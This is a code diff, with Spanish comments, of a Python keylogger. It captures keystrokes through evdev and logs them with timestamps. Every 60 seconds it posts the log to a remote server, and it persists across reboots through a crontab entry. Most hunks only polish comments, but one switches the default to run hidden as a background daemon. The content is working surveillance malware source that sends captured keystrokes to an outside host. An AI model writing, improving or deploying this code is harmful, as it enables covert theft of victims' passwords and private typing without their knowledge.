@@ -71,9 +71,9 @@ CONFIG_FILE = "config.json"
 DEFAULT_CONFIG = {
     "log_file": "keylogger.log",
     "remote_url": "http://<IP>:<Port>/log",  #IP a donde se envía el archivo. 
-    "send_interval": 60,               # Intervalo de tiempo para enviar el archivo.
-    "max_log_size_mb": 0.01,              # Rotar el archivo cuando el tamaño se sobrepase.
-    "daemon": False,                    # Se ejecuta como un daemon en el background.
+    "send_interval": 60,               # Intervalo de tiempo para enviar el archivo (60 segundos).
+    "max_log_size_mb": 0.01,              # Rotar el archivo cuando el tamaño se sobrepase (10 kb).
+    "daemon": True,                    # Se ejecuta como un daemon en el background.
     "persistence": True,               # Se añade a Crontab para iniciar automáticamente.
     "terminate_key": "<esc>",           # Tecla para terminar el keylogger.
     "timestamp_format": "%Y-%m-%d %H:%M:%S" #Formato para el timestamp de cada tecla
@@ -85,8 +85,7 @@ DEFAULT_CONFIG = {
 #######################################
 
 def load_config():
-    """Carga la configuración del archivo JSON si ya existe 
-    o en caso contrario lo crea con la configuración por defecto."""
+    """Carga la configuración del archivo JSON si ya existe  o en caso contrario lo crea con la configuración por defecto."""
     if os.path.exists(CONFIG_FILE):
         with open(CONFIG_FILE, 'r') as f:
             config = json.load(f)
@@ -126,14 +125,14 @@ def daemonize():
 # ------------------------------------------------------------
 def add_persistence(script_path):
     try:
-        # Revisa si ya existe la linea en el crontab
+        # Revisa si ya existe la línea en el crontab
         existing = subprocess.check_output("crontab -l", shell=True, text=True, stderr=subprocess.DEVNULL)
         if script_path in existing:
             return  # La línea existe
     except subprocess.CalledProcessError:
         existing = ""  # No crontab yet
 
-    # Añade la linea al script para que se inicie automáticamente.
+    # Añade la línea al script para que se inicie automáticamente.
     cron_line = f"@reboot /usr/bin/python3 {script_path} >/dev/null 2>&1\n"
     new_cron = existing + cron_line
     with open("/tmp/current_cron", "w") as f:
@@ -178,7 +177,7 @@ class Keylogger:
 
         print(f"Usando dispositivo: {self.device.name}")
 
-        #Variables de control para el listener
+        #Variables de control para el listener y el bucle infinito del listener
         self.running = True
         self.listener_thread = threading.Thread(target=self._event_loop, daemon=True)
         self.listener_thread.start()
@@ -237,25 +236,25 @@ class Keylogger:
             # Chequear la rotación del log
             self.check_rotation()
 
-            # Enviar el log periodicamente cuando el intervalo se acabe
+            # Enviar el log periodicamente cuando el intervalo se cumpla
             if self.remote_url and time.time() - self.last_send > self.send_interval:
                 self.send_file(self.log_file)
 
             # Detenerlo si se presiona la tecla configurada en el JSON
             if self.terminate_key:
-                # Convertir la tecla de terminacion a su equivalente en evev
+                # Convertir la tecla de terminacion a su equivalente en evdev
                 term_code = self._terminate_key_to_code(self.terminate_key)
                 if term_code and key_event.keycode == term_code:
                     print("Tecla de terminación presionada, deteniendo...")
                     self.running = False
 
         except Exception as e:
-            # Log error but don't crash
+            # Imprime el error
             print(f"Error en callback: {e}")
 
 
     def _terminate_key_to_code(self, key_str):
-        """Convierte una cadena como  <esc> a su keycode """
+        """Convierte una cadena como  <esc> a su keycode para evdev """
         # Mapeo de nombres comunes
         mapping = {
             "<esc>": "KEY_ESC",
@@ -290,7 +289,7 @@ class Keylogger:
             print(f"Error en la rotación: {e}")
 
     def send_file(self, filepath):
-        """Envía el archivo .lgo a un servidor remoto via HTTP POST."""
+        """Envía el archivo .log a un servidor remoto via HTTP POST."""
         try:
             with open(filepath, 'rb') as f:
                 content = f.read()
@@ -302,7 +301,7 @@ class Keylogger:
 
 
     def cleanup(self):
-        """Cierra el archivo y se envia na ultima vez."""
+        """Cierra el archivo y se envia una ultima vez."""
         self.running = False
         if self.remote_url:
             self.send_file(self.log_file)
